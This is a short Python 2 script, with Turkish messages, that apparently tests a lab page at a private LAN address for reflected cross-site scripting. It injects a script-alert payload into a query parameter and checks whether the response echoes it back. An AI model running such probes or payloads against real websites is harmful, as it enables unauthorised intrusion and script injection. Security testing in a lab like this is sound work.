import requests
payload="<script>alert('cyberege')</script>"
url="http://192.168.43.161/xss/example1.php?name=root"
indis=url.find("=")
url=url[:indis+1]+payload
print url
sonuc=requests.get(url)
if payload in sonuc.content:
    print "[+]XSS vardir"